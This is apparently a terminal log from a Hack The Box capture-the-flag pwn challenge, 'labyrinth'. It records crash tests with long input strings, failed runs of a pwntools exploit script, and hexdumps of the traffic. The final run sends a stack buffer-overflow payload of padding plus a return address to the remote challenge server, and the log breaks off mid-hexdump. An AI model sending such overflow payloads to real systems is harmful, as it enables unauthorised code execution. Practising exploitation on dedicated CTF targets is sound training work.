+bash: line 1:   718 Done                    echo -e '69\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+       719 Segmentation fault      | timeout 2 ./labyrinth 2>&1
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> ls
+
+
+    Directory: C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          1/5/2026   2:25 PM                glibc
+-a----          1/5/2026   2:25 PM             25 flag.txt
+-a----          1/5/2026   2:25 PM          17192 labyrinth
+
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && (echo '69'; echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA') | timeout 3 ./labyrinth 2>&1"
+
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    '|'    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
+
+>> 
+You are heading to open the door but you suddenly see something on the wall:
+
+"Fly like a bird and be free!"
+
+Would you like to change the door you chose?
+
+>> 
+[-] YOU FAILED TO ESCAPE!
+
+timeout: the monitored command dumped core
+bash: line 1:   729 Done                    ( echo '69'; echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' )
+       730 Segmentation fault      | timeout 3 ./labyrinth 2>&1
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth && python3 exploit.py"
+[*] '/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/labyrinth'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'./glibc/'
+[-] Starting local process './challenge/labyrinth': Failed                                                     
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/exploit.py", line 45, in <module>
+    io = process(BINARY)
+         ^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/process.py", line 332, in __init__
+    self.proc = subprocess.Popen(args = args,
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
+    self._execute_child(args, executable, preexec_fn, close_fds,
+  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
+    raise child_exception_type(errno_num, err_msg, err_filename)
+FileNotFoundError: [Errno 2] No such file or directory: './challenge/labyrinth'
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && python3 ../exploit.py REMOTE"
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/../exploit.py", line 10, in <module>  
+    context.binary = BINARY
+    ^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/context/__init__.py", line 176, in fset
+    self._tls[name] = validator(self, val)
+                      ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/context/__init__.py", line 873, in binary
+    binary = ELF(binary)
+             ^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/elf/elf.py", line 219, in __init__
+    self.file = open(path,'rb')
+                ^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory: './challenge/labyrinth'
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && python3 ../exploit.py REMOTE"
+[+] Opening connection to 94.237.120.74 on port 53289: Done
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/../exploit.py", line 47, in <module>  
+    exploit(io)
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/../exploit.py", line 23, in exploit   
+    io.sendlineafter(b'>>', b'69')
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 841, in sendlineafter
+    res = self.recvuntil(delim, timeout=timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer        
+    data = self.recv_raw(self.buffer.get_fill_size())
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
+    raise EOFError
+EOFError
+[*] Closed connection to 94.237.120.74 port 53289
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && python3 ../exploit.py REMOTE"
+[+] Opening connection to 94.237.120.74 on port 53289: Done
+[DEBUG] Received 0x24f bytes:
+    00000000  1b 5b 32 4a  1b 5b 30 3b  30 48 1b 5b  31 3b 33 35  │·[2J│·[0;│0H·[│1;35│       
+    00000010  6d 0a e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │m···│····│····│····│       
+    00000020  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000030  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000040  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    00000050  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000060  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000070  96 92 e2 96  92 e2 96 92  e2 96 92 0a  e2 96 92 2d  │····│····│····│···-│       
+    00000080  e2 96 b8 20  20 20 20 20  20 20 20 e2  96 92 20 20  │··· │    │   ·│··  │       
+    00000090  20 20 20 20  20 20 20 20  20 e2 96 92  20 20 20 20  │    │    │ ···│    │       
+    000000a0  20 20 20 20  20 20 e2 96  92 0a e2 96  92 2d e2 96  │    │  ··│····│·-··│       
+    000000b0  b8 20 20 20  20 20 20 20  20 e2 96 92  20 20 20 20  │·   │    │ ···│    │       
+    000000c0  20 4f 20 20  20 20 20 e2  96 92 20 20  20 20 20 20  │ O  │   ·│··  │    │       
+    000000d0  20 20 20 20  e2 96 92 0a  e2 96 92 2d  e2 96 b8 20  │    │····│···-│··· │       
+    000000e0  20 20 20 20  20 20 20 e2  96 92 20 20  20 20 27 7c  │    │   ·│··  │  '|│       
+    000000f0  27 20 20 20  20 e2 96 92  20 20 20 20  20 20 20 20  │'   │ ···│    │    │       
+    00000100  20 20 e2 96  92 0a e2 96  92 2d e2 96  b8 20 20 20  │  ··│····│·-··│·   │       
+    00000110  20 20 20 20  20 e2 96 92  20 20 20 20  2f 20 5c 20  │    │ ···│    │/ \ │       
+    00000120  20 20 20 e2  96 92 20 20  20 20 20 20  20 20 20 20  │   ·│··  │    │    │       
+    00000130  e2 96 92 0a  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000140  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000150  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    00000160  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000170  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 b2 e2  │····│····│····│····│       
+    00000180  96 b3 e2 96  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  │····│····│····│····│       
+    00000190  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  92 0a 0a 53  │····│····│····│···S│       
+    000001a0  65 6c 65 63  74 20 64 6f  6f 72 3a 20  0a 0a 44 6f  │elec│t do│or: │··Do│       
+    000001b0  6f 72 3a 20  30 30 31 20  44 6f 6f 72  3a 20 30 30  │or: │001 │Door│: 00│       
+    000001c0  32 20 44 6f  6f 72 3a 20  30 30 33 20  44 6f 6f 72  │2 Do│or: │003 │Door│       
+    000001d0  3a 20 30 30  34 20 44 6f  6f 72 3a 20  30 30 35 20  │: 00│4 Do│or: │005 │       
+    000001e0  44 6f 6f 72  3a 20 30 30  36 20 44 6f  6f 72 3a 20  │Door│: 00│6 Do│or: │       
+    000001f0  30 30 37 20  44 6f 6f 72  3a 20 30 30  38 20 44 6f  │007 │Door│: 00│8 Do│       
+    00000200  6f 72 3a 20  30 30 39 20  44 6f 6f 72  3a 20 30 31  │or: │009 │Door│: 01│       
+    00000210  30 20 0a 44  6f 6f 72 3a  20 30 31 31  20 44 6f 6f  │0 ·D│oor:│ 011│ Doo│       
+    00000220  72 3a 20 30  31 32 20 44  6f 6f 72 3a  20 30 31 33  │r: 0│12 D│oor:│ 013│       
+    00000230  20 44 6f 6f  72 3a 20 30  31 34 20 44  6f 6f 72 3a  │ Doo│r: 0│14 D│oor:│       
+    00000240  20 30 31 35  20 44 6f 6f  72 3a 20 30  31 36 20     │ 015│ Doo│r: 0│16 │        
+    0000024f
+[DEBUG] Received 0x355 bytes:
+    b'Door: 017 Door: 018 Door: 019 Door: 020 \n'
+    b'Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 \n'
+    b'Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 \n'
+    b'Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 \n'
+    b'Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 \n'
+    b'Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 \n'
+    b'Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 \n'
+    b'Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 \n'
+    b'Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \n'
+    b'\n'
+    b'>> '
+[DEBUG] Sent 0x3 bytes:
+    b'50\n'
+[DEBUG] Received 0x23 bytes:
+    00000000  0a 1b 5b 31  3b 33 31 6d  5b 2d 5d 20  59 4f 55 20  │··[1│;31m│[-] │YOU │       
+    00000010  46 41 49 4c  45 44 20 54  4f 20 45 53  43 41 50 45  │FAIL│ED T│O ES│CAPE│       
+    00000020  21 0a 0a                                            │!··│
+    00000023
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/../exploit.py", line 46, in <module>
+    exploit(io)
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/../exploit.py", line 25, in exploit
+    io.recvuntil(b'>>')
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer        
+    data = self.recv_raw(self.buffer.get_fill_size())
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
+    raise EOFError
+EOFError
+[*] Closed connection to 94.237.120.74 port 53289
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && python3 ../exploit.py REMOTE"
+[+] Opening connection to 94.237.120.74 on port 53289: Done
+[DEBUG] Received 0x587 bytes:
+    00000000  1b 5b 32 4a  1b 5b 30 3b  30 48 1b 5b  31 3b 33 35  │·[2J│·[0;│0H·[│1;35│       
+    00000010  6d 0a e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │m···│····│····│····│       
+    00000020  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000030  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000040  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    00000050  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000060  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000070  96 92 e2 96  92 e2 96 92  e2 96 92 0a  e2 96 92 2d  │····│····│····│···-│       
+    00000080  e2 96 b8 20  20 20 20 20  20 20 20 e2  96 92 20 20  │··· │    │   ·│··  │       
+    00000090  20 20 20 20  20 20 20 20  20 e2 96 92  20 20 20 20  │    │    │ ···│    │       
+    000000a0  20 20 20 20  20 20 e2 96  92 0a e2 96  92 2d e2 96  │    │  ··│····│·-··│       
+    000000b0  b8 20 20 20  20 20 20 20  20 e2 96 92  20 20 20 20  │·   │    │ ···│    │       
+    000000c0  20 4f 20 20  20 20 20 e2  96 92 20 20  20 20 20 20  │ O  │   ·│··  │    │       
+    000000d0  20 20 20 20  e2 96 92 0a  e2 96 92 2d  e2 96 b8 20  │    │····│···-│··· │       
+    000000e0  20 20 20 20  20 20 20 e2  96 92 20 20  20 20 27 7c  │    │   ·│··  │  '|│       
+    000000f0  27 20 20 20  20 e2 96 92  20 20 20 20  20 20 20 20  │'   │ ···│    │    │       
+    00000100  20 20 e2 96  92 0a e2 96  92 2d e2 96  b8 20 20 20  │  ··│····│·-··│·   │       
+    00000110  20 20 20 20  20 e2 96 92  20 20 20 20  2f 20 5c 20  │    │ ···│    │/ \ │       
+    00000120  20 20 20 e2  96 92 20 20  20 20 20 20  20 20 20 20  │   ·│··  │    │    │       
+    00000130  e2 96 92 0a  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000140  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    00000150  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    00000160  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    00000170  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 b2 e2  │····│····│····│····│       
+    00000180  96 b3 e2 96  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  │····│····│····│····│       
+    00000190  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  92 0a 0a 53  │····│····│····│···S│       
+    000001a0  65 6c 65 63  74 20 64 6f  6f 72 3a 20  0a 0a 44 6f  │elec│t do│or: │··Do│       
+    000001b0  6f 72 3a 20  30 30 31 20  44 6f 6f 72  3a 20 30 30  │or: │001 │Door│: 00│       
+    000001c0  32 20 44 6f  6f 72 3a 20  30 30 33 20  44 6f 6f 72  │2 Do│or: │003 │Door│       
+    000001d0  3a 20 30 30  34 20 44 6f  6f 72 3a 20  30 30 35 20  │: 00│4 Do│or: │005 │       
+    000001e0  44 6f 6f 72  3a 20 30 30  36 20 44 6f  6f 72 3a 20  │Door│: 00│6 Do│or: │       
+    000001f0  30 30 37 20  44 6f 6f 72  3a 20 30 30  38 20 44 6f  │007 │Door│: 00│8 Do│       
+    00000200  6f 72 3a 20  30 30 39 20  44 6f 6f 72  3a 20 30 31  │or: │009 │Door│: 01│       
+    00000210  30 20 0a 44  6f 6f 72 3a  20 30 31 31  20 44 6f 6f  │0 ·D│oor:│ 011│ Doo│       
+    00000220  72 3a 20 30  31 32 20 44  6f 6f 72 3a  20 30 31 33  │r: 0│12 D│oor:│ 013│       
+    00000230  20 44 6f 6f  72 3a 20 30  31 34 20 44  6f 6f 72 3a  │ Doo│r: 0│14 D│oor:│       
+    00000240  20 30 31 35  20 44 6f 6f  72 3a 20 30  31 36 20 44  │ 015│ Doo│r: 0│16 D│       
+    00000250  6f 6f 72 3a  20 30 31 37  20 44 6f 6f  72 3a 20 30  │oor:│ 017│ Doo│r: 0│       
+    00000260  31 38 20 44  6f 6f 72 3a  20 30 31 39  20 44 6f 6f  │18 D│oor:│ 019│ Doo│       
+    00000270  72 3a 20 30  32 30 20 0a  44 6f 6f 72  3a 20 30 32  │r: 0│20 ·│Door│: 02│       
+    00000280  31 20 44 6f  6f 72 3a 20  30 32 32 20  44 6f 6f 72  │1 Do│or: │022 │Door│       
+    00000290  3a 20 30 32  33 20 44 6f  6f 72 3a 20  30 32 34 20  │: 02│3 Do│or: │024 │       
+    000002a0  44 6f 6f 72  3a 20 30 32  35 20 44 6f  6f 72 3a 20  │Door│: 02│5 Do│or: │       
+    000002b0  30 32 36 20  44 6f 6f 72  3a 20 30 32  37 20 44 6f  │026 │Door│: 02│7 Do│       
+    000002c0  6f 72 3a 20  30 32 38 20  44 6f 6f 72  3a 20 30 32  │or: │028 │Door│: 02│       
+    000002d0  39 20 44 6f  6f 72 3a 20  30 33 30 20  0a 44 6f 6f  │9 Do│or: │030 │·Doo│       
+    000002e0  72 3a 20 30  33 31 20 44  6f 6f 72 3a  20 30 33 32  │r: 0│31 D│oor:│ 032│       
+    000002f0  20 44 6f 6f  72 3a 20 30  33 33 20 44  6f 6f 72 3a  │ Doo│r: 0│33 D│oor:│       
+    00000300  20 30 33 34  20 44 6f 6f  72 3a 20 30  33 35 20 44  │ 034│ Doo│r: 0│35 D│       
+    00000310  6f 6f 72 3a  20 30 33 36  20 44 6f 6f  72 3a 20 30  │oor:│ 036│ Doo│r: 0│       
+    00000320  33 37 20 44  6f 6f 72 3a  20 30 33 38  20 44 6f 6f  │37 D│oor:│ 038│ Doo│       
+    00000330  72 3a 20 30  33 39 20 44  6f 6f 72 3a  20 30 34 30  │r: 0│39 D│oor:│ 040│       
+    00000340  20 0a 44 6f  6f 72 3a 20  30 34 31 20  44 6f 6f 72  │ ·Do│or: │041 │Door│       
+    00000350  3a 20 30 34  32 20 44 6f  6f 72 3a 20  30 34 33 20  │: 04│2 Do│or: │043 │       
+    00000360  44 6f 6f 72  3a 20 30 34  34 20 44 6f  6f 72 3a 20  │Door│: 04│4 Do│or: │       
+    00000370  30 34 35 20  44 6f 6f 72  3a 20 30 34  36 20 44 6f  │045 │Door│: 04│6 Do│       
+    00000380  6f 72 3a 20  30 34 37 20  44 6f 6f 72  3a 20 30 34  │or: │047 │Door│: 04│       
+    00000390  38 20 44 6f  6f 72 3a 20  30 34 39 20  44 6f 6f 72  │8 Do│or: │049 │Door│       
+    000003a0  3a 20 30 35  30 20 0a 44  6f 6f 72 3a  20 30 35 31  │: 05│0 ·D│oor:│ 051│       
+    000003b0  20 44 6f 6f  72 3a 20 30  35 32 20 44  6f 6f 72 3a  │ Doo│r: 0│52 D│oor:│       
+    000003c0  20 30 35 33  20 44 6f 6f  72 3a 20 30  35 34 20 44  │ 053│ Doo│r: 0│54 D│       
+    000003d0  6f 6f 72 3a  20 30 35 35  20 44 6f 6f  72 3a 20 30  │oor:│ 055│ Doo│r: 0│       
+    000003e0  35 36 20 44  6f 6f 72 3a  20 30 35 37  20 44 6f 6f  │56 D│oor:│ 057│ Doo│       
+    000003f0  72 3a 20 30  35 38 20 44  6f 6f 72 3a  20 30 35 39  │r: 0│58 D│oor:│ 059│       
+    00000400  20 44 6f 6f  72 3a 20 30  36 30 20 0a  44 6f 6f 72  │ Doo│r: 0│60 ·│Door│       
+    00000410  3a 20 30 36  31 20 44 6f  6f 72 3a 20  30 36 32 20  │: 06│1 Do│or: │062 │       
+    00000420  44 6f 6f 72  3a 20 30 36  33 20 44 6f  6f 72 3a 20  │Door│: 06│3 Do│or: │       
+    00000430  30 36 34 20  44 6f 6f 72  3a 20 30 36  35 20 44 6f  │064 │Door│: 06│5 Do│       
+    00000440  6f 72 3a 20  30 36 36 20  44 6f 6f 72  3a 20 30 36  │or: │066 │Door│: 06│       
+    00000450  37 20 44 6f  6f 72 3a 20  30 36 38 20  44 6f 6f 72  │7 Do│or: │068 │Door│       
+    00000460  3a 20 30 36  39 20 44 6f  6f 72 3a 20  30 37 30 20  │: 06│9 Do│or: │070 │       
+    00000470  0a 44 6f 6f  72 3a 20 30  37 31 20 44  6f 6f 72 3a  │·Doo│r: 0│71 D│oor:│       
+    00000480  20 30 37 32  20 44 6f 6f  72 3a 20 30  37 33 20 44  │ 072│ Doo│r: 0│73 D│       
+    00000490  6f 6f 72 3a  20 30 37 34  20 44 6f 6f  72 3a 20 30  │oor:│ 074│ Doo│r: 0│       
+    000004a0  37 35 20 44  6f 6f 72 3a  20 30 37 36  20 44 6f 6f  │75 D│oor:│ 076│ Doo│       
+    000004b0  72 3a 20 30  37 37 20 44  6f 6f 72 3a  20 30 37 38  │r: 0│77 D│oor:│ 078│       
+    000004c0  20 44 6f 6f  72 3a 20 30  37 39 20 44  6f 6f 72 3a  │ Doo│r: 0│79 D│oor:│       
+    000004d0  20 30 38 30  20 0a 44 6f  6f 72 3a 20  30 38 31 20  │ 080│ ·Do│or: │081 │       
+    000004e0  44 6f 6f 72  3a 20 30 38  32 20 44 6f  6f 72 3a 20  │Door│: 08│2 Do│or: │       
+    000004f0  30 38 33 20  44 6f 6f 72  3a 20 30 38  34 20 44 6f  │083 │Door│: 08│4 Do│       
+    00000500  6f 72 3a 20  30 38 35 20  44 6f 6f 72  3a 20 30 38  │or: │085 │Door│: 08│       
+    00000510  36 20 44 6f  6f 72 3a 20  30 38 37 20  44 6f 6f 72  │6 Do│or: │087 │Door│       
+    00000520  3a 20 30 38  38 20 44 6f  6f 72 3a 20  30 38 39 20  │: 08│8 Do│or: │089 │       
+    00000530  44 6f 6f 72  3a 20 30 39  30 20 0a 44  6f 6f 72 3a  │Door│: 09│0 ·D│oor:│       
+    00000540  20 30 39 31  20 44 6f 6f  72 3a 20 30  39 32 20 44  │ 091│ Doo│r: 0│92 D│       
+    00000550  6f 6f 72 3a  20 30 39 33  20 44 6f 6f  72 3a 20 30  │oor:│ 093│ Doo│r: 0│       
+    00000560  39 34 20 44  6f 6f 72 3a  20 30 39 35  20 44 6f 6f  │94 D│oor:│ 095│ Doo│       
+    00000570  72 3a 20 30  39 36 20 44  6f 6f 72 3a  20 30 39 37  │r: 0│96 D│oor:│ 097│       
+    00000580  20 44 6f 6f  72 3a 20                               │ Doo│r: │
+    00000587
+[DEBUG] Received 0x1d bytes:
+    b'098 Door: 099 Door: 100 \n'
+    b'\n'
+    b'>> '
+[DEBUG] Sent 0x3 bytes:
+    b'69\n'
+[DEBUG] Received 0xa0 bytes:
+    b'\n'
+    b'You are heading to open the door but you suddenly see something on the wall:\n'
+    b'\n'
+    b'"Fly like a bird and be free!"\n'
+    b'\n'
+    b'Would you like to change the door you chose?\n'
+    b'\n'
+    b'>> '
+[DEBUG] Sent 0x41 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│       
+    *
+    00000030  41 41 41 41  41 41 41 41  55 12 40 00  00 00 00 00  │AAAA│AAAA│U·@·│····│       
+    00000040  0a                                                  │·│
+    00000041
+[*] Switching to interactive mode
+ [DEBUG] Received 0x214 bytes:
+    00000000  0a 1b 5b 31  3b 33 31 6d  5b 2d 5d 20  59 4f 55 20  │··[1│;31m│[-] │YOU │       
+    00000010  46 41 49 4c  45 44 20 54  4f 20 45 53  43 41 50 45  │FAIL│ED T│O ES│CAPE│       
+    00000020  21 0a 0a 0a  20 20 20 20  20 20 20 20  20 20 20 20  │!···│    │    │    │       
+    00000030  20 20 20 20  5c 4f 2f 20  20 20 20 20  20 20 20 20  │    │\O/ │    │    │       
+    00000040  20 20 20 20  20 20 0a 20  20 20 20 20  20 20 20 20  │    │  · │    │    │       
+    00000050  20 20 20 20  20 20 20 20  7c 20 20 20  20 20 20 20  │    │    │|   │    │       
+    00000060  20 20 20 20  20 20 20 20  20 20 0a 20  20 20 20 20  │    │    │  · │    │       
+    00000070  20 20 20 20  20 20 20 20  20 20 20 2f  20 5c 20 20  │    │    │   /│ \  │       
+    00000080  20 20 20 20  20 20 20 20  20 20 20 20  20 0a e2 96  │    │    │    │ ···│       
+    00000090  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    000000a0  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    000000b0  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 20 20  │····│····│····│··  │       
+    000000c0  20 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │ ···│····│····│····│       
+    000000d0  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    000000e0  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    000000f0  92 0a e2 96  92 2d e2 96  b8 20 20 20  20 20 20 20  │····│·-··│·   │    │       
+    00000100  20 e2 96 92  20 20 20 20  20 20 20 20  20 20 20 e2  │ ···│    │    │   ·│       
+    00000110  96 92 20 20  20 20 20 20  20 20 20 20  e2 96 92 0a  │··  │    │    │····│       
+    00000120  e2 96 92 2d  e2 96 b8 20  20 20 20 20  20 20 20 e2  │···-│··· │    │   ·│       
+    00000130  96 92 20 20  20 20 20 20  20 20 20 20  20 e2 96 92  │··  │    │    │ ···│       
+    00000140  20 20 20 20  20 20 20 20  20 20 e2 96  92 0a e2 96  │    │    │  ··│····│       
+    00000150  92 2d e2 96  b8 20 20 20  20 20 20 20  20 e2 96 92  │·-··│·   │    │ ···│       
+    00000160  20 20 20 20  20 20 20 20  20 20 20 e2  96 92 20 20  │    │    │   ·│··  │       
+    00000170  20 20 20 20  20 20 20 20  e2 96 92 0a  e2 96 92 2d  │    │    │····│···-│       
+    00000180  e2 96 b8 20  20 20 20 20  20 20 20 e2  96 92 20 20  │··· │    │   ·│··  │       
+    00000190  20 20 20 20  20 20 20 20  20 e2 96 92  20 20 20 20  │    │    │ ···│    │       
+    000001a0  20 20 20 20  20 20 e2 96  92 0a e2 96  92 e2 96 92  │    │  ··│····│····│       
+    000001b0  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
